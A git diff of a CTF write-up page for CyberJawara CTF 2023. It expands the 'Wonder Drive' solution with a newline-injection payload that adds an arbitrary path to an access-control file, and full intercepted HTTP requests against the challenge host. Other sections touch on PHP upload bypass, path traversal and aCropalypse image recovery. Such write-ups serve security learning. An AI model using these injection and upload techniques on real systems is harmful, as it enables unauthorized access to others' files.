@@ -52,10 +52,9 @@
   
   
   
-  <meta name="description" content="Web Wonder Drive (5 Solves, 850 Points)
+  <meta name="description" content="Web Wonder Drive Abusing newline character to append arbitrary filepath to obtain unauhtorized access in a drive sharing webapp (5 Solves, 850 Points)
 The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
-if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
-data[&#39;filepath&#39;] = test..%0arepository/wonderadmin/flag.txt when the above payload is executed, it will write repository/wonderadmin/flag." />
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) access_file is a file that controls the path an account can access." />
   <meta name="author" content="Berlian Gabriel" />
   
 
@@ -112,20 +111,18 @@ data[&#39;filepath&#39;] = test..%0arepository/wonderadmin/flag.txt when the abo
   
   
   <meta itemprop="name" content="CyberJawara CTF 2023">
-<meta itemprop="description" content="Web Wonder Drive (5 Solves, 850 Points)
+<meta itemprop="description" content="Web Wonder Drive Abusing newline character to append arbitrary filepath to obtain unauhtorized access in a drive sharing webapp (5 Solves, 850 Points)
 The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
-if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
-data[&#39;filepath&#39;] = test..%0arepository/wonderadmin/flag.txt when the above payload is executed, it will write repository/wonderadmin/flag."><meta itemprop="datePublished" content="2023-12-03T19:32:26+07:00" />
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) access_file is a file that controls the path an account can access."><meta itemprop="datePublished" content="2023-12-03T19:32:26+07:00" />
 <meta itemprop="dateModified" content="2023-12-03T19:32:26+07:00" />
-<meta itemprop="wordCount" content="901">
+<meta itemprop="wordCount" content="1325">
 <meta itemprop="keywords" content="" />
   
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="CyberJawara CTF 2023"/>
-<meta name="twitter:description" content="Web Wonder Drive (5 Solves, 850 Points)
+<meta name="twitter:description" content="Web Wonder Drive Abusing newline character to append arbitrary filepath to obtain unauhtorized access in a drive sharing webapp (5 Solves, 850 Points)
 The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
-if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
-data[&#39;filepath&#39;] = test..%0arepository/wonderadmin/flag.txt when the above payload is executed, it will write repository/wonderadmin/flag."/>
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) access_file is a file that controls the path an account can access."/>
 
   
   
@@ -266,26 +263,113 @@ data[&#39;filepath&#39;] = test..%0arepository/wonderadmin/flag.txt when the abo
 
   <section><h1 id="web">Web</h1>
 <h2 id="wonder-drive">Wonder Drive</h2>
-<p>(5 Solves, 850 Points)</p>
+<p>Abusing newline character to append arbitrary filepath to obtain unauhtorized access in a drive sharing webapp
+(5 Solves, 850 Points)</p>
 <p>The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
         access_file <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;accounts/</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">/access&#34;</span>
         <span style="color:#66d9ef">with</span> open(access_file, <span style="color:#e6db74">&#34;a&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ascii&#34;</span>) <span style="color:#66d9ef">as</span> f:
             f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>data[<span style="color:#e6db74">&#39;filepath&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
         <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;user_repository_root&#39;</span>, username<span style="color:#f92672">=</span>username))
-</code></pre></div><p>we want to add <code>repository/wonderadmin/flag.txt</code>  to access_file, and we can do so by abusing the newline character.</p>
-<pre tabindex="0"><code>data['filepath'] = test..%0arepository/wonderadmin/flag.txt
+</code></pre></div><p>access_file is a file that controls the path an account can access. If the path to a file exists as an entry in access_file, the corresponding account will be able to access that file.
+we want to add <code>repository/wonderadmin/flag.txt</code>  to access_file, and we can do so by abusing the newline character.</p>
+<pre tabindex="0"><code>data['filepath'] = test\nrepository/wonderadmin/flag.txt
 </code></pre><p>when the above payload is executed, it will write <code>repository/wonderadmin/flag.txt</code> to access_file in a new line.</p>
 <pre tabindex="0"><code>repository/test
 repository/wonderadmin/flag.txt
 </code></pre><p>This will allow our user account to access the flag.</p>
 <p>But first thing first, we need to create the following folders and upload the file on our own drive, to make this file path exist
-<code>repository/user/test..%0arepository/wonderadmin/flag.txt</code></p>
-<p>Once we shared the file and accept_share the token, we can access wonderadmin/flag.txt
-<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/cyberjawara-ctf-2023/Pasted%20image%2020231204032954.png?raw=true" alt=""></p>
+<code>repository/{username}/test%0arepository/wonderadmin/flag.txt</code></p>
+<p>Once we shared the file and accept_share the token, we can access wonderadmin/flag.txt</p>
+<h3 id="common-pitfalls">Common Pitfalls</h3>
+<p>If you are creating the folder from the webapp in a browser, the newline character <code>%0a</code> will be URL-encoded to <code>%250a</code> which will prevent our exploit from working. If you are using Burpsuite, make sure to intercept the request and change <code>%250a</code> to <code>%0a</code></p>
+<p>Request to create directory</p>
+<pre tabindex="0"><code>POST /create_directory HTTP/1.1
+Host: wonder-drive.ctf.cyberjawara.id
+Cookie: _ga=GA1.1.100328777.1701502669; _ga_8YH0DHGR6E=GS1.1.1701502668.1.1.1701502680.0.0.0; session=eyJ1c2VybmFtZSI6ImZnaGZnaGZnaGoifQ.ZWvbhg.uDKAAxoIN8feTpAq0PnU6HzoMIg
+Content-Length: 60
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+Origin: https://wonder-drive.ctf.cyberjawara.id
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://wonder-drive.ctf.cyberjawara.id/repository/fghfghfghj/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Connection: close
+
+directory_name=test%0arepository%2Fwonderadmin&amp;current_path=
+</code></pre><p>The directory you just created will not be visitable from the webapp as it will return 404 Not Found when clicked. When uploading <code>flag.txt</code>, make sure also intercept the request, and replace the <code>directory</code> query paramter value with <code>test%0arepository/wonderadmin</code></p>
+<p>Request to upload <code>flag.txt</code></p>
+<pre tabindex="0"><code>POST /upload?directory=test%0arepository/wonderadmin HTTP/1.1
+Host: wonder-drive.ctf.cyberjawara.id
+Cookie: _ga=GA1.1.100328777.1701502669; _ga_8YH0DHGR6E=GS1.1.1701502668.1.1.1701502680.0.0.0; session=eyJ1c2VybmFtZSI6ImZnaGZnaGZnaGoifQ.ZWvbhg.uDKAAxoIN8feTpAq0PnU6HzoMIg
+Content-Length: 190
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+Origin: https://wonder-drive.ctf.cyberjawara.id
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycERDeiyM6pVu0A5A
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://wonder-drive.ctf.cyberjawara.id/repository/fghfghfghj/test%250arepository/wonderadmin
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Connection: close
+
+------WebKitFormBoundarycERDeiyM6pVu0A5A
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;
+Content-Type: text/plain
+
+REDACTED
+------WebKitFormBoundarycERDeiyM6pVu0A5A--
+
+</code></pre><p>Lastly, make sure to also intercept the replace the <code>file_path</code> parameter when sharing the file
+Request to share <code>flag.txt</code></p>
+<pre tabindex="0"><code>POST /share HTTP/1.1
+Host: wonder-drive.ctf.cyberjawara.id
+Cookie: _ga=GA1.1.100328777.1701502669; _ga_8YH0DHGR6E=GS1.1.1701502668.1.1.1701502680.0.0.0; session=eyJ1c2VybmFtZSI6ImZnaGZnaGZnaGoifQ.ZWvbhg.uDKAAxoIN8feTpAq0PnU6HzoMIg
+Content-Length: 72
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://wonder-drive.ctf.cyberjawara.id
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://wonder-drive.ctf.cyberjawara.id/repository/fghfghfghj/test%250arepository/wonderadmin/flag.txt
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+Connection: close
+
+username=fghfghfghj&amp;file_path=test%0arepository%2Fwonderadmin%2Fflag.txt
+</code></pre><p>Use the token obtained from the request above to <code>accept_share</code> in your account.
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/cyberjawara-ctf-2023/new.png?raw=true" alt=""></p>
+<p>You can now access <code>repository/wonderadmin/flag.txt</code> from your account.</p>
 <p>FLAG: <code>CJ2023{wonderful_trick!_zzzzzzzzzzzzzzzzzzzz}</code></p>
 <h2 id="magic-1">Magic 1</h2>
-<p>(28 Solves, 300 Points)</p>
+<p>Bypassing file upload checking by using image mime type leading to PHP code execution
+(28 Solves, 300 Points)</p>
 <p>The webapp returns <code>Error when doing magic.</code> even for normal image upload, because the imagick cannot access the tmp file due to already being moved to <code>results</code> folder. However, the file is still uploaded, and can be retrieved from the <code>results</code> folder.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;image&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#39;results/original-&#39;</span> <span style="color:#f92672">.</span> $_FILES[<span style="color:#e6db74">&#39;image&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
         $resizedImagePath <span style="color:#f92672">=</span> <span style="color:#a6e22e">resizeImage</span>($_FILES[<span style="color:#e6db74">&#39;image&#39;</span>]);
@@ -299,7 +383,8 @@ repository/wonderadmin/flag.txt
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/cyberjawara-ctf-2023/Pasted%20image%2020231204012852.png?raw=true" alt=""></p>
 <p>FLAG: <code>CJ2023{4n0th3r_unrestricted_file_upload__}</code></p>
 <h2 id="static-web">Static Web</h2>
-<p>(63 Solves, 300 Points)</p>
+<p>Non-recursive pathname sanitation leading to path traversal
+(63 Solves, 300 Points)</p>
 <p>Given the following index.js source code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">http</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http&#39;</span>);
 <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
@@ -368,7 +453,8 @@ Armed with this exploit, we can now perform path traversal to retrieve the conte
 <p>FLAG: <code>CJ2023{1st_warmup_and_m1c_ch3ck}</code></p>
 <h1 id="forensic">Forensic</h1>
 <h2 id="apocalypse">Apocalypse</h2>
-<p>(12 Solves, 610 Points)</p>
+<p>CVE-2023-21036 Google Android BitmapExport.java logic error, in which a cropped image can be recovered to its original uncropped state. Recover corrupt PNG files with missing length-byte and CRC.
+(12 Solves, 610 Points)</p>
 <p>The screenshot is vulnerable to <em>aCropalypse</em> (<em>CVE</em> 2023-21036).
 However, the two screenshots need to be recovered first. The screenshots have missing length and CRC for IHDR, sRGB, sBIT, eXIf, and IDAT. We can compare the screenshots with an actual cropped screenshot to better understand the missing structure.</p>
 <p>The basic idea is to set the length-byte to the right value, and calculate the corresponding CRC.  We can use <code>pngcheck</code> to analyze the CRC and this tool: PCRT (<a href="https://github.com/sherlly/PCRT">GitHub - sherlly/PCRT: PCRT (PNG Check &amp; Repair Tool), a tool to help check and fix the error in a PNG image.</a>) to automate the fixing process.</p>
